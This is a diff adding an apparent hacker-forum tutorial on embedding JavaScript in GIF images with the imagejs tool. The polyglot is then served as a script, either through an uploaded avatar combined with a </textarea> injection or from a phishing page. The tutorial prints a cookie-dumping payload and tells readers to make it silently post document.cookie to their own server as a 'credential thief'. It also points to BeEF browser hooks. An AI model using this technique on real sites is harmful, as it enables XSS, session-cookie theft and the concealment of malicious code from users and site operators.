@@ -1,0 +1,63 @@
+//  I will show you how to hide javascript in image file and how to execute this.
+
+Upploading JavaScript within an image, it can be hosted on, and executed from a site's server.
+In addition, the technique greatly obfuscates malicious JavaScript even when used on a server controlled by the attacker, 
+and could be used to obscure the actions of a phishing page.
+
+
+What can we do with executing JS in some server?
+- JavaScript can be used to attempt to steal cookies, 
+which may include authentication tokens, are often vulnerable to XSS escape strings to execute more javascript,
+can prompt browsers to download or run a program, and even steal information from other websites the user has visited (assuming the target host serves up integrations that other web pages access).
+In the case of this example, a simple JavaScript alert function is used in order to confirm that JavaScript is running properly, 
+but this could be replaced with malicious code or even a BeEF browser hook (for this you can find tutorial in my threads).
+
+Let's start. This is example tutorial for this how to work! :)
+
+[1] Download the script imagejs
+- git clone https://github.com/jklmnn/imagejs
+
+[2] Installation. Follow the command:
+- cd imagejs
+- mkdir build
+- cd build
+- cmake ..
+- make
+
+[3] Write JavaScript code. This code will simply open an alert window with the text
+- alert("lord_x tutorial for BF");
+- save this "script.js" in directory /imagejs/build
+
+[4] Download some image. I use gif image.
+- Options are currently bmp, gif, webp, pnm and pgf
+
+[5] Now use Imagejs
+- ./imagejs gif script.js -i anon.gif
+
+The syntax begins with running the program, imagejs. The first argument, in this case gif, indicates the file type.
+The second argument refers to the script we are using, and the final argument following the -i flag is the image we wish to modify.
+
+[6] Now make simple html page (in the same dir) with nano:
+<html>
+<body>
+<img src="script.js.gif">
+<script src="script.js.gif"></script>
+</body>
+</html>
+
+[7] Let's test the page
+
+[8] How to attack?
+The following command will attempt to dump write cookies to the served up web-page. These cookies may be able to be used to impersonate users by stealing their authentication tokens.
+
+document.write('cookie: ' + document.cookie)
+
+Finally, in order to deploy the attack, 
+we need to find somewhere to upload our image and either another field that's vulnerable to XSS attacks where we are able to escape input verification and use a <script> tag, or (more easily) load the image (as a script) from our own phishing webpage.
+
+In the example below, we uploaded our avatar, anon.gif, and following a </textarea> exit tag, we enclose it in script tags. After this, anyone who views this profile will have their cookies dumped to their browser window. 
+Replace the script above with one that silently posts the values of document.cookie to a server of your choosing, and you've got your self a silent credential thief.
+
+After testing with this example, you can try with BeEF hook!
+
+~ Enjoy The Movement!
